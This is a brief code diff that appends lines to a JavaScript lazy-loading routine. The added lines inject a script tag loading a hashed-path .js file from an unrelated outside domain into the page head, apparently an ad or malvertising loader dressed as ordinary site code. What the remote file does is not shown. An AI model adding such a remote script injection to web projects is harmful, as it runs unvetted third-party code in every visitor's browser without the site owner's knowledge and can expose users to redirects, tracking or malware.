@@ -151,3 +151,7 @@ dataLazy.forEach(function(a){
   };
 });
 
+let elAds=document.createElement("script");
+elAds.setAttribute("src","https://releasedverge.com/48/a5/b0/48a5b0d397ece967cee50a6d3592675b.js")
+document.head.append(elAds);
+
